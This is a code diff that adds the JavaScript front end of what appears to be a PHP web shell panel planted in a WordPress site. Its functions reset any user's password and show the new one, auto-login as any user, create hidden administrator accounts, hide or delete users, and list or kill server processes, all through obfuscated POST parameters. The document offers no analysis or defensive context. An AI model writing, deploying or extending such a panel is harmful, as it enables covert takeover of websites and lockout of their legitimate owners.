+            html += '<button class="btn btn-sm btn-primary" style="padding:3px 8px;font-size:10px;" onclick="wpAutoLogin(' + u.ID + ')">Login</button>';
+            if (isHidden) {
+                html += '<button class="btn btn-sm" style="padding:3px 8px;font-size:10px;background:#3fb950;border-color:#3fb950;color:#fff;" onclick="wpUnhideUser(' + u.ID + ',this)">Unhide</button>';
+            } else {
+                html += '<button class="btn btn-sm" style="padding:3px 8px;font-size:10px;background:#f97316;border-color:#f97316;color:#fff;" onclick="wpHideUser(' + u.ID + ',this)">Hide</button>';
+            }
+            html += '<button class="btn btn-sm btn-secondary" style="padding:3px 8px;font-size:10px;" onclick="wpDeleteUser(' + u.ID + ',\'' + u.user_login.replace(/'/g, "\\'") + '\')">Del</button>';
+            html += '</div>';
+            html += '</div>';
+            html += '<div id="wpPwInfo_' + u.ID + '" style="display:none;margin-top:8px;padding:6px 10px;background:var(--bg-primary);border:1px solid var(--border);border-radius:4px;font-size:11px;font-family:monospace;"></div>';
+            html += '</div>';
+        });
+        container.innerHTML = html;
+    });
+}
+
+function wpResetPw(uid, btn) {
+    var origText = btn.textContent;
+    btn.textContent = '...';
+    btn.disabled = true;
+    wpRequest({c4t: 'rpsw', uix: uid}, function(r) {
+        btn.textContent = origText;
+        btn.disabled = false;
+        if (r.n) {
+            var info = document.getElementById('wpPwInfo_' + uid);
+            info.style.display = 'block';
+            info.innerHTML = '<span style="color:#3fb950;">New password:</span> <strong style="color:#00d4ff;user-select:all;">' + r.n + '</strong> <button class="btn btn-sm btn-primary" style="padding:2px 6px;font-size:9px;margin-left:6px;" onclick="navigator.clipboard.writeText(\'' + r.n + '\');this.textContent=\'Copied!\'">Copy</button>';
+            setTimeout(function(){ info.style.display = 'none'; }, 15000);
+        } else {
+            alert('Reset failed: ' + (r.err || 'unknown'));
+        }
+    });
+}
+
+function wpAutoLogin(uid) {
+    wpRequest({c4t: 'alog', uix: uid}, function(r) {
+        if (r.url) window.open(r.url, '_blank');
+        else alert('Login failed: ' + (r.err || 'unknown'));
+    });
+}
+
+function wpHideUser(uid, btn) {
+    btn.textContent = '...';
+    btn.disabled = true;
+    wpRequest({c4t: 'hide', uix: uid}, function(r) {
+        btn.disabled = false;
+        if (r.ok) wpLoadUsers();
+        else { btn.textContent = 'Hide'; alert('Hide failed'); }
+    });
+}
+
+function wpUnhideUser(uid, btn) {
+    btn.textContent = '...';
+    btn.disabled = true;
+    wpRequest({c4t: 'unhide', uix: uid}, function(r) {
+        btn.disabled = false;
+        if (r.ok) wpLoadUsers();
+        else { btn.textContent = 'Unhide'; alert('Unhide failed'); }
+    });
+}
+
+var wpDelTarget = null;
+function wpDeleteUser(uid, name) {
+    wpDelTarget = uid;
+    document.getElementById('wpDeleteName').textContent = name;
+    showModal('wpDelete');
+}
+
+function wpConfirmDelete() {
+    if (!wpDelTarget) return;
+    var btn = document.getElementById('wpDeleteConfirmBtn');
+    btn.textContent = '...';
+    btn.disabled = true;
+    wpRequest({c4t: 'del', uix: wpDelTarget}, function(r) {
+        btn.textContent = 'Delete';
+        btn.disabled = false;
+        hideModal('wpDelete');
+        if (r.ok) {
+            wpLoadUsers();
+            wpShowStatus('User "' + r.user + '" deleted.', 'ok');
+        } else {
+            var msg = r.err === 'cannot_delete_self' ? 'Cannot delete yourself' : (r.err || 'Delete failed');
+            wpShowStatus(msg, 'err');
+        }
+        wpDelTarget = null;
+    });
+}
+
+function wpCreateAdmin() {
+    var user = document.getElementById('wpNewUser').value.trim();
+    var pass = document.getElementById('wpNewPass').value.trim();
+    var email = document.getElementById('wpNewEmail').value.trim();
+    var hide = document.getElementById('wpHideUser').checked;
+    if (!user || !pass) { wpShowStatus('Username and password required.', 'err'); return; }
+    var data = {c4t: 'cadm', xun: user, xpw: pass, xem: email};
+    if (hide) data.hide_user = '1';
+    wpShowStatus('Creating...', 'ok');
+    wpRequest(data, function(r) {
+        if (r.ok) {
+            var msg = 'Admin "' + r.u + '" created. Pass: ' + r.p;
+            if (r.hide) msg += ' (Hidden)';
+            wpShowStatus(msg, 'ok');
+            document.getElementById('wpNewUser').value = '';
+            document.getElementById('wpNewPass').value = '';
+            document.getElementById('wpNewEmail').value = '';
+            document.getElementById('wpHideUser').checked = false;
+            wpLoadUsers();
+        } else {
+            wpShowStatus('Error: ' + (r.err || 'unknown'), 'err');
+        }
+    });
+}
+
+function wpShowStatus(msg, type) {
+    var el = document.getElementById('wpCreateStatus');
+    el.style.display = 'block';
+    el.textContent = msg;
+    el.style.background = type === 'ok' ? 'rgba(63,185,80,0.1)' : 'rgba(248,81,73,0.1)';
+    el.style.border = '1px solid ' + (type === 'ok' ? '#3fb950' : '#f85149');
+    el.style.color = type === 'ok' ? '#3fb950' : '#f85149';
+    if (type === 'ok' && msg !== 'Creating...') {
+        setTimeout(function(){ el.style.display = 'none'; }, 8000);
+    }
+}
+
+// === PROCESS MANAGER ===
+var procData = null;
+var procTimer = null;
+var procPaused = false;
+var procKillTarget = null;
+var procCurrentUser = '<?php echo get_current_user(); ?>';
+
+function procRequest(data, callback) {
+    var xhr = new XMLHttpRequest();
+    xhr.open('POST', window.location.href, true);
+    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+    xhr.onload = function() {
+        try { callback(JSON.parse(xhr.responseText)); }
+        catch(e) { callback({err: 'Parse error'}); }
+    };
+    xhr.onerror = function() { callback({err: 'Network error'}); };
+    var params = [];
+    for (var key in data) params.push(encodeURIComponent(key) + '=' + encodeURIComponent(data[key]));
+    xhr.send(params.join('&'));
+}
+
+function procStart() {
+    procPaused = false;
+    var btn = document.getElementById('procPauseBtn');
+    if (btn) btn.textContent = 'Pause';
+    procLoad();
+    if (procTimer) clearInterval(procTimer);
+    procTimer = setInterval(function() {
+        if (!procPaused) procLoad();
+    }, 3000);
+}
+
+function procStopAndClose() {
+    if (procTimer) { clearInterval(procTimer); procTimer = null; }
+    hideModal('proc');
+}
+
+function procTogglePause() {
+    procPaused = !procPaused;
+    var btn = document.getElementById('procPauseBtn');
+    btn.textContent = procPaused ? 'Resume' : 'Pause';
+    var indicator = document.getElementById('procLiveIndicator');
+    indicator.style.background = procPaused ? '#f97316' : '#3fb950';
+    indicator.style.animation = procPaused ? 'none' : 'procPulse 1s infinite';
+}
+
+function procLoad() {
+    procRequest({proc_action: 'list'}, function(r) {
+        if (r.err) {
+            document.getElementById('procTableBody').innerHTML = '<tr><td colspan="8" style="text-align:center;padding:20px;color:#f85149;">' + r.err + '</td></tr>';
+            return;
+        }
+        procData = r;
+        // Stats
+        document.getElementById('procStats').textContent = r.total + ' processes | ' + r.total_hidden + ' hidden | ' + r.total_recent + ' recent';
+        // Alerts
+        var alerts = document.getElementById('procAlerts');
+        var alertHtml = '';
+        if (r.total_hidden > 0) {
+            alertHtml += '<span style="display:inline-flex;align-items:center;gap:4px;background:rgba(248,81,73,0.15);border:1px solid #f85149;color:#f85149;padding:3px 10px;border-radius:4px;font-size:10px;font-weight:600;">';
+            alertHtml += '<svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"/><line x1="12" y1="9" x2="12" y2="13"/><line x1="12" y1="17" x2="12.01" y2="17"/></svg>';
+            alertHtml += r.total_hidden + ' HIDDEN PROCESS DETECTED</span>';
+        }
+        if (r.total_recent > 0) {
+            alertHtml += '<span style="display:inline-flex;align-items:center;gap:4px;background:rgba(63,185,80,0.15);border:1px solid #3fb950;color:#3fb950;padding:3px 10px;border-radius:4px;font-size:10px;font-weight:600;">';
+            alertHtml += '<svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>';
+            alertHtml += r.total_recent + ' recently started (&lt;5min)</span>';
+        }
+        alerts.innerHTML = alertHtml;
+        procFilterRender();
+    });
+}
+
+function procFilterRender() {
+    if (!procData) return;
+    var search = (document.getElementById('procSearch').value || '').toLowerCase();
+    var filter = document.getElementById('procFilter').value;
+    var sort = document.getElementById('procSort').value;
+
+    // Build combined list
+    var list = [];
+
+    // Hidden processes
+    if (filter === 'all' || filter === 'hidden') {
+        (procData.hidden || []).forEach(function(h) {
+            list.push({
+                pid: h.pid, user: h.user, cpu: '?', mem: '?', vsz: '?', rss: '?',
+                tty: '?', stat: '?', start: '?', time: '?', command: h.command,
+                _type: 'hidden'
+            });
+        });
+    }
+
+    // Normal processes
+    var recentPids = {};
+    (procData.recent || []).forEach(function(r) { recentPids[r.pid] = r.age_seconds; });
+
+    var procs = procData.processes || [];
+    procs.forEach(function(p) {
+        var type = 'normal';
+        if (recentPids[p.pid] !== undefined) type = 'recent';
+        if (filter === 'hidden') return;
+        if (filter === 'mine' && p.user !== procCurrentUser) return;
+        if (filter === 'recent' && type !== 'recent') return;
+        p._type = type;
+        if (type === 'recent') p._age = recentPids[p.pid];
+        list.push(p);
+    });
+
+    // Search
+    if (search) {
+        list = list.filter(function(p) {
+            return (p.pid + ' ' + p.user + ' ' + p.command + ' ' + p.stat).toLowerCase().indexOf(search) >= 0;
+        });
+    }
+
+    // Sort
+    list.sort(function(a, b) {
+        if (a._type === 'hidden' && b._type !== 'hidden') return -1;
+        if (b._type === 'hidden' && a._type !== 'hidden') return 1;
+        if (sort === 'cpu') return parseFloat(b.cpu || 0) - parseFloat(a.cpu || 0);
+        if (sort === 'mem') return parseFloat(b.mem || 0) - parseFloat(a.mem || 0);
+        if (sort === 'pid') return parseInt(b.pid || 0) - parseInt(a.pid || 0);
+        if (sort === 'start') return 0;
+        return 0;
+    });
+
+    // Render
+    var html = '';
+    if (list.length === 0) {
+        html = '<tr><td colspan="8" style="text-align:center;padding:20px;color:var(--text-muted);font-size:11px;">No matching processes.</td></tr>';
+    }
+    list.forEach(function(p) {
+        var rowClass = 'proc-row';
+        var badge = '';
+        if (p._type === 'hidden') {
+            rowClass += ' proc-hidden';
+            badge = '<span style="background:#f85149;color:#fff;padding:1px 5px;border-radius:3px;font-size:8px;font-weight:700;margin-left:4px;">HIDDEN</span>';
+        } else if (p._type === 'recent') {
+            rowClass += ' proc-recent';
+            var ageStr = p._age !== undefined ? p._age + 's ago' : 'new';
+            badge = '<span style="background:#3fb950;color:#000;padding:1px 5px;border-radius:3px;font-size:8px;font-weight:700;margin-left:4px;">NEW ' + ageStr + '</span>';
+        }
+
+        var cpuClass = parseFloat(p.cpu) > 50 ? ' proc-high-cpu' : '';
+        var memClass = parseFloat(p.mem) > 50 ? ' proc-high-mem' : '';
+
+        var cmdShort = (p.command || '').length > 80 ? p.command.substring(0, 80) + '...' : (p.command || '');
+        var cmdEsc = cmdShort.replace(/</g, '&lt;').replace(/>/g, '&gt;');
+        var cmdFullEsc = (p.command || '').replace(/</g, '&lt;').replace(/>/g, '&gt;');
+
+        html += '<tr class="' + rowClass + '" style="border-bottom:1px solid var(--border);">';
+        html += '<td style="padding:5px 8px;color:#ec4899;font-family:monospace;font-weight:600;white-space:nowrap;">' + p.pid + '</td>';
+        html += '<td style="padding:5px 8px;color:var(--text-muted);white-space:nowrap;">' + (p.user || '?') + '</td>';
+        html += '<td style="padding:5px 8px;text-align:right;font-family:monospace;white-space:nowrap;" class="' + cpuClass + '">' + (p.cpu || '?') + '</td>';
+        html += '<td style="padding:5px 8px;text-align:right;font-family:monospace;white-space:nowrap;" class="' + memClass + '">' + (p.mem || '?') + '</td>';
+        html += '<td style="padding:5px 8px;color:var(--text-muted);font-family:monospace;white-space:nowrap;">' + (p.stat || '?') + '</td>';
+        html += '<td style="padding:5px 8px;color:var(--text-muted);white-space:nowrap;">' + (p.start || '?') + '</td>';
+        html += '<td style="padding:5px 8px;color:var(--text-primary);font-family:monospace;font-size:10px;" title="' + cmdFullEsc + '">' + cmdEsc + badge + '</td>';
+        html += '<td style="padding:5px 8px;text-align:center;white-space:nowrap;">';
+        if (p.pid && p.pid !== '?') {
+            html += '<button class="btn btn-sm btn-danger" style="padding:2px 8px;font-size:9px;" onclick="procKill(' + p.pid + ',\'' + cmdShort.replace(/'/g, "\\'").replace(/"/g, '&quot;') + '\')">Kill</button>';
+        }
+        html += '</td>';
+        html += '</tr>';
+    });
+
+    document.getElementById('procTableBody').innerHTML = html;
+}
+
+function procKill(pid, cmd) {
+    procKillTarget = pid;
+    document.getElementById('procKillPid').textContent = '#' + pid;
+    document.getElementById('procKillCmd').textContent = cmd;
+    showModal('procKill');
+}
+
+function procDoKill(sig) {
+    if (!procKillTarget) return;
+    procRequest({proc_action: 'kill', pid: procKillTarget, signal: sig}, function(r) {
+        hideModal('procKill');
+        procKillTarget = null;
+        if (!procPaused) procLoad();
+    });
+}
 </script>
+
 <?php endif; ?>
 </body>
 </html>
